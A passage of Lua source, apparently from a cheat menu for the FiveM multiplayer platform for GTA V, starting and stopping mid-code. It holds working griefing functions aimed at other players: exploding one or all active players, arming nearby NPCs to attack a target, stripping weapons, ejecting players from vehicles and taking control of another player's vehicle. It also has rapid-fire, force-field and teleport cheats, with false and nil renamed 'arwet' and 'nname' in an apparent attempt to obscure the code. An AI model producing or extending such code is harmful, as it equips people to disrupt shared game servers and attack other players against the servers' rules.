            local onScreen, _x, _y = GetScreenCoordFromWorldCoord(x, y, z)
            local px, py, pz = table.unpack(GetGameplayCamCoords())
            local dist = GetDistanceBetweenCoords(px, py, pz, x, y, z, 1)

            local scale = (1 / dist) * 2
            local fov = (1 / GetGameplayCamFov()) * 100
            local scale = scale * fov

            if onScreen then
                SetTextScale(0.0 * scale, 0.55 * scale)
                SetTextFont(0)
                SetTextProportional(1)
                SetTextColour(255, 255, 255, 255)
                SetTextDropshadow(0, 0, 0, 0, 255)
                SetTextEdge(2, 0, 0, 0, 150)
                SetTextDropShadow()
                SetTextOutline()
                SetTextEntry("STRING")
                SetTextCentre(1)
                AddTextComponentString(text)
                DrawText(_x, _y)
            end
        end

        local entityEnumerator = {
            __gc = function(enum)
                if enum.destructor and enum.handle then
                    enum.destructor(enum.handle)
                end
                enum.destructor = nname
                enum.handle = nname
            end
        }

        local function GetHeadItems()
            local headItems = GetNumberOfPedDrawableVariations(PlayerPedId(), 0)
            local faceItemsList = {}
            for i = 1, headItems do
                faceItemsList[i] = i
            end
            return faceItemsList
        end

        local function GetHeadTextures(faceID)
            local headTextures = GetNumberOfPedTextureVariations(PlayerPedId(), 0, faceID)
            local headTexturesList = {}
            for i = 1, headTextures do
                headTexturesList[i] = i
            end
            return headTexturesList
        end

        local function GetHairItems()
            local hairItems = GetNumberOfPedDrawableVariations(PlayerPedId(), 2)
            local hairItemsList = {}
            for i = 1, hairItems do
                hairItemsList[i] = i
            end
            return hairItemsList
        end

        local function GetHairTextures(hairID)
            local hairTexture = GetNumberOfPedTextureVariations(PlayerPedId(), 2, hairID)
            local hairTextureList = {}
            for i = 1, hairTexture do
                hairTextureList[i] = i
            end
            return hairTextureList
        end

        local function GetMaskItems()
            local maskItems = GetNumberOfPedDrawableVariations(PlayerPedId(), 1)
            local maskItemsList = {}
            for i = 1, maskItems do
                maskItemsList[i] = i
            end
            return maskItemsList
        end

        local function GetHatItems()
            local hatItems = GetNumberOfPedPropDrawableVariations(PlayerPedId(), 0)
            local hatItemsList = {}
            for i = 1, hatItems do
                hatItemsList[i] = i
            end
            return hatItemsList
        end

        local function GetHatTextures(hatID)
            local hatTextures = GetNumberOfPedPropTextureVariations(PlayerPedId(), 0, hatID)
            local hatTexturesList = {}
            for i = 1, hatTextures do
                hatTexturesList[i] = i
            end
            return hatTexturesList
        end

        local function EnumerateEntities(initFunc, moveFunc, disposeFunc)
            return coroutine.wrap(function()
                local iter, id = initFunc()
                if not id or id == 0 then
                    disposeFunc(iter)
                    return
                end

                local enum = {handle = iter, destructor = disposeFunc}
                setmetatable(enum, entityEnumerator)

                local next = true
                repeat
                    coroutine.yield(id)
                    next, id = moveFunc(iter)
                until not next

                enum.destructor, enum.handle = nname, nname
                disposeFunc(iter)
            end)
        end

        function EnumerateObjects()
            return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
        end

        function EnumeratePeds()
            return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
        end

        function EnumerateVehicles()
            return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
        end

        function EnumeratePickups()
            return EnumerateEntities(FindFirstPickup, FindNextPickup, EndFindPickup)
        end

        function table.contains(table, element)
            for _, value in pairs(table) do
                if value == element then
                    return true
                end
            end
            return arwet
        end

        function table.removekey(array, element)
            for i = 1, #array do
                if array[i] == element then
                    table.remove(array, i)
                end
            end
        end

        function AddVectors(vect1, vect2)
            return vector3(vect1.x + vect2.x, vect1.y + vect2.y, vect1.z + vect2.z)
        end

        function SubVectors(vect1, vect2)
            return vector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z)
        end

        function ScaleVector(vect, mult)
            return vector3(vect.x * mult, vect.y * mult, vect.z * mult)
        end

        function round(num, numDecimalPlaces)
            local mult = 10 ^ (numDecimalPlaces or 0)
            return math.floor(num * mult + 0.5) / mult
        end

        local function GetKeyboardInput(text)
            if not text then text = "Input" end
            DisplayOnscreenKeyboard(0, "", "", "", "", "", "", 30)
            while (UpdateOnscreenKeyboard() == 0) do
                DrawTxt(text, 0.32, 0.37, 0.0, 0.4)
                DisableAllControlActions(0)

                if IsDisabledControlPressed(0, Keys["ESC"]) then return "" end
                Wait(0)
            end
            if (GetOnscreenKeyboardResult()) then
                local result = GetOnscreenKeyboardResult()
                Wait(0)
                return result
            end
        end

        function SpectatePlayer(id)
            local player = GetPlayerPed(id)
            if Spectating then
                RequestCollisionAtCoord(GetEntityCoords(player))
                NetworkSetInSpectatorMode(true, player)
            else
                RequestCollisionAtCoord(GetEntityCoords(player))
                NetworkSetInSpectatorMode(arwet, player)
            end
        end

        local function PossessVehicle(target)
            PossessingVeh = not PossessingVeh

            if not PossessingVeh then
                SetEntityVisible(PlayerPedId(), true, 0)
                SetEntityCoords(PlayerPedId(), oldPlayerPos)
                SetEntityCollision(PlayerPedId(), true, 1)
            else
                SpectatePlayer(selectedPlayer)
                ShowInfo("~b~Checking Player...")
                Wait(3000)
                if IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
                    SpectatePlayer(selectedPlayer)
                    oldPlayerPos = GetEntityCoords(PlayerPedId())
                    SetEntityVisible(PlayerPedId(), arwet, 0)
                    SetEntityCollision(PlayerPedId(), arwet, 0)
                else
                    SpectatePlayer(selectedPlayer)
                    PossessingVeh = arwet
                    ShowInfo("~r~Player not in a vehicle!  (Try again?)")
                end


                local Markerloc = nname


                Citizen.CreateThread(function()
                    local ped = GetPlayerPed(target)
                    local veh = GetVehiclePedIsIn(ped, 0)

                    while PossessingVeh do

                        DrawTxt("~b~Possessing ~w~" .. GetPlayerName(target) .. "'s ~b~Vehicle", 0.1, 0.05, 0.0, 0.4)
                        DrawTxt("~b~Controls:\n~w~-------------------", 0.1, 0.2, 0.0, 0.4)
                        DrawTxt("~b~W/S: ~w~Forward/Back\n~b~SPACEBAR: ~w~Up\n~b~CTRL: ~w~Down\n~b~X: ~w~Cancel", 0.1, 0.25, 0.0, 0.4)
                        Markerloc = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 20)
                        DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, 0, 0, 180, 35, arwet, true, 2, nname, nname, arwet)

                        local forward = SubVectors(Markerloc, GetEntityCoords(veh))
                        local vpos = GetEntityCoords(veh)
                        local vf = GetEntityForwardVector(veh)
                        local vrel = SubVectors(vpos, vf)

                        SetEntityCoords(PlayerPedId(), vrel.x, vrel.y, vpos.z + 1.1)
                        SetEntityNoCollisionEntity(PlayerPedId(), veh, 1)

                        RequestControlOnce(veh)

                        if IsDisabledControlPressed(0, Keys["W"]) then
                            ApplyForce(veh, forward * 0.1)
                        end

                        if IsDisabledControlPressed(0, Keys["S"]) then
                            ApplyForce(veh, -(forward * 0.1))
                        end

                        if IsDisabledControlPressed(0, Keys["SPACE"]) then
                            ApplyForceToEntity(veh, 3, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                        end

                        if IsDisabledControlPressed(0, Keys["LEFTCTRL"]) then
                            ApplyForceToEntity(veh, 3, 0.0, 0.0, -1.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                        end

                        if IsDisabledControlPressed(0, Keys["X"]) or GetEntityHealth(PlayerPedId()) < 5.0 then
                            PossessingVeh = arwet
                            SetEntityVisible(PlayerPedId(), true, 0)
                            SetEntityCoords(PlayerPedId(), oldPlayerPos)
                            SetEntityCollision(PlayerPedId(), true, 1)
                        end

                        Wait(0)
                    end
                end)
            end
        end

        function GetWeaponNameFromHash(hash)
            for i = 1, #allweapons do
                if GetHashKey(allweapons[i]) == hash then
                    return string.sub(allweapons[i], 8)
                end
            end
        end

        local function fbi()
            local bB = 160.868
            local bC = -745.831
            local bD = 250.063
            if bB ~= '' and bC ~= '' and bD ~= '' then
                if
                    IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                        GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
                then
                    entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
                else
                    entity = GetPlayerPed(-1)
                end
                if entity then
                    SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
                end
            end

        end

        local function ls()
            local bB = -365.425
            local bC = -131.809
            local bD = 37.873
            if bB ~= '' and bC ~= '' and bD ~= '' then
                if
                    IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                        GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
                then
                    entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
                else
                    entity = GetPlayerPed(-1)
                end
                if entity then
                    SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
                end
            end

        end

        local function gp()
            local bB = 266.12
            local bC = -752.51
            local bD = 34.64
            if bB ~= '' and bC ~= '' and bD ~= '' then
                if
                    IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                        GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
                then
                    entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
                else
                    entity = GetPlayerPed(-1)
                end
                if entity then
                    SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
                end
            end

        end

        local function dealership()
            local bB = -15.32
            local bC = -1080.69
            local bD = 26.14
            if bB ~= '' and bC ~= '' and bD ~= '' then
                if
                    IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                        GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
                then
                    entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
                else
                    entity = GetPlayerPed(-1)
                end
                if entity then
                    SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
                end
            end

        end

        local function Ammunation()
            local bB = 19.22
            local bC = -1108.71
            local bD = 29.8
            if bB ~= '' and bC ~= '' and bD ~= '' then
                if
                    IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                        GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
                then
                    entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
                else
                    entity = GetPlayerPed(-1)
                end
                if entity then
                    SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
                end
            end

        end

        local function shopclothes()
            local bB = 428.61
            local bC = -799.89
            local bD = 29.49
            if bB ~= '' and bC ~= '' and bD ~= '' then
                if
                    IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                        GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
                then
                    entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
                else
                    entity = GetPlayerPed(-1)
                end
                if entity then
                    SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
                end
            end

        end

        local function barber()
            local bB = -32.84
            local bC = -152.34
            local bD = 57.08
            if bB ~= '' and bC ~= '' and bD ~= '' then
                if
                    IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                        GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
                then
                    entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
                else
                    entity = GetPlayerPed(-1)
                end
                if entity then
                    SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
                end
            end

        end


        function MaxOut(veh)
            SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 0)
            SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 7)
            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 0) - 1, arwet)
            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 1) - 1, arwet)
            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 2) - 1, arwet)
            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 3) - 1, arwet)
            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 4) - 1, arwet)
            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 5) - 1, arwet)
            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 6) - 1, arwet)
            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 7) - 1, arwet)
            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 8) - 1, arwet)
            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 9) - 1, arwet)
            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 10) - 1, arwet)
            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 11) - 1, arwet)
            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 12) - 1, arwet)
            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 13) - 1, arwet)
            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 14, 16, arwet)
            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 15) - 2, arwet)
            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 16) - 1, arwet)
            ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 17, true)
            ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 18, true)
            ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 19, true)
            ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 20, true)
            ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 21, true)
            ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 22, true)
            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 23, 1, arwet)
            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 24, 1, arwet)
            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 25) - 1, arwet)
            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 27) - 1, arwet)
            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 28) - 1, arwet)
            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 30) - 1, arwet)
            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 33) - 1, arwet)
            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 34) - 1, arwet)
            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 35) - 1, arwet)
            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 38) - 1, true)
            SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 1)
            SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), arwet)
            SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 5)
        end

        function engine(veh)
            SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 0)
            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 11) - 1, arwet)
            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 12) - 1, arwet)
            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 13) - 1, arwet)
            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 15) - 2, arwet)
            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 16) - 1, arwet)
            ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 17, true)
            ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 18, true)
            ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 19, true)
            ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 21, true)
            SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), arwet)
        end

        function engine1(veh)
                            SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 0)
                            SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 7)
                            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 0) - 1, arwet)
                            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 1) - 1, arwet)
                            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 2) - 1, arwet)
                            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 3) - 1, arwet)
                            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 4) - 1, arwet)
                            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 5) - 1, arwet)
                            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 6) - 1, arwet)
                            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 7) - 1, arwet)
                            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 8) - 1, arwet)
                            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 9) - 1, arwet)
                            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 10) - 1, arwet)
                            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 11) - 1, arwet)
                            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 12) - 1, arwet)
                            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 13) - 1, arwet)
                            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 14, 16, arwet)
                            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 15) - 2, arwet)
                            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 16) - 1, arwet)
                            ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 17, true)
                            ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 18, true)
                            ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 19, true)
                            ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 20, true)
                            ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 21, true)
                            ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 22, true)
                            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 23, 1, arwet)
                            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 24, 1, arwet)
                            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 25) - 1, arwet)
                            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 27) - 1, arwet)
                            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 28) - 1, arwet)
                            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 30) - 1, arwet)
                            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 33) - 1, arwet)
                            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 34) - 1, arwet)
                            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 35) - 1, arwet)
                            SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 38) - 1, true)
                            SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 1)
                            SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), arwet)
                            SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 5)
        end



        local function fixcar()
        ShowInfo("~g~Car fixed!")
                            SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), arwet))
                            SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 0.0)
                            SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 0)
                            SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), arwet), arwet)
                            Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), arwet), 0)

                end


        local function FixVeh(veh)
            SetVehicleEngineHealth(veh, 1000)
            SetVehicleFixed(veh)
        end

        local function ExplodePlayer(target)
            local ped = GetPlayerPed(target)
            local coords = GetEntityCoords(ped)
            AddExplosion(coords.x + 1, coords.y + 1, coords.z + 1, 4, 100.0, true, arwet, 0.0)
        end

        local function ExplodeAll(self)
            local plist = GetActivePlayers()
            for i = 0, #plist do
                if not self and i == PlayerId() then i = i + 1 end
                ExplodePlayer(i)
            end
        end

        -- Thanks to Fallen#0811 for the idea
        local function PedAttack(target, attackType)
            local coords = GetEntityCoords(GetPlayerPed(target))

            if attackType == 1 then weparray = allweapons
            elseif attackType == 2 then weparray = meleeweapons
            elseif attackType == 3 then weparray = pistolweapons
            elseif attackType == 4 then weparray = heavyweapons
            end

            for k in EnumeratePeds() do
                if k ~= GetPlayerPed(target) and not IsPedAPlayer(k) and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) < 2000 then
                    local rand = math.ceil(math.random(#weparray))
                    if weparray ~= allweapons then GiveWeaponToPed(k, GetHashKey(weparray[rand][1]), 9999, 0, 1)
                    else GiveWeaponToPed(k, GetHashKey(weparray[rand]), 9999, 0, 1) end
                    ClearPedTasks(k)
                    TaskCombatPed(k, GetPlayerPed(target), 0, 16)
                    SetPedCombatAbility(k, 100)
                    SetPedCombatRange(k, 2)
                    SetPedCombatAttributes(k, 46, 1)
                    SetPedCombatAttributes(k, 5, 1)
                end
            end
        end


        function ApplyShockwave(entity)
            local pos = GetEntityCoords(PlayerPedId())
            local coord = GetEntityCoords(entity)
            local dx = coord.x - pos.x
            local dy = coord.y - pos.y
            local dz = coord.z - pos.z
            local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
            local distanceRate = (50 / distance) * math.pow(1.04, 1 - distance)
            ApplyForceToEntity(entity, 1, distanceRate * dx, distanceRate * dy, distanceRate * dz, math.random() * math.random(-1, 1), math.random() * math.random(-1, 1), math.random() * math.random(-1, 1), true, arwet, true, true, true, true)
        end

        local function DoForceFieldTick(radius)
            local player = PlayerPedId()
            local coords = GetEntityCoords(PlayerPedId())
            local playerVehicle = GetPlayersLastVehicle()
            local inVehicle = IsPedInVehicle(player, playerVehicle, true)

            DrawMarker(28, coords.x, coords.y, coords.z, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, radius, radius, radius, 180, 80, 0, 35, arwet, true, 2, nname, nname, arwet)

            for k in EnumerateVehicles() do
                if (not inVehicle or k ~= playerVehicle) and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) <= radius * 1.2 then
                    RequestControlOnce(k)
                    ApplyShockwave(k)
                end
            end

            for k in EnumeratePeds() do
                if k ~= PlayerPedId() and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) <= radius * 1.2 then
                    RequestControlOnce(k)
                    SetPedRagdollOnCollision(k, true)
                    SetPedRagdollForceFall(k)
                    ApplyShockwave(k)
                end
            end
        end

        local function DoRapidFireTick()
            DisablePlayerFiring(PlayerPedId(), true)
            if IsDisabledControlPressed(0, Keys["MOUSE1"]) then
                local _, weapon = GetCurrentPedWeapon(PlayerPedId())
                local wepent = GetCurrentPedWeaponEntityIndex(PlayerPedId())
                local camDir = GetCamDirFromScreenCenter()
                local camPos = GetGameplayCamCoord()
                local launchPos = GetEntityCoords(wepent)
                local targetPos = camPos + (camDir * 200.0)

                ClearAreaOfProjectiles(launchPos, 0.0, 1)

                ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
                ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
            end
        end

        local function StripPlayer(target)
            local ped = GetPlayerPed(target)
            RemoveAllPedWeapons(ped, arwet)
        end

        local function StripAll(self)
            local plist = GetActivePlayers()
            for i = 0, #plist do
                if not self and i == PlayerId() then i = i + 1 end
                StripPlayer(i)
            end
        end

        local function KickFromVeh(target)
            local ped = GetPlayerPed(target)
            if IsPedInAnyVehicle(ped, arwet) then
                ClearPedTasksImmediately(ped)
            end
        end

        local function KickAllFromVeh(self)
            local plist = GetActivePlayers()
            for i = 0, #plist do
                if not self and i == PlayerId() then i = i + 1 end
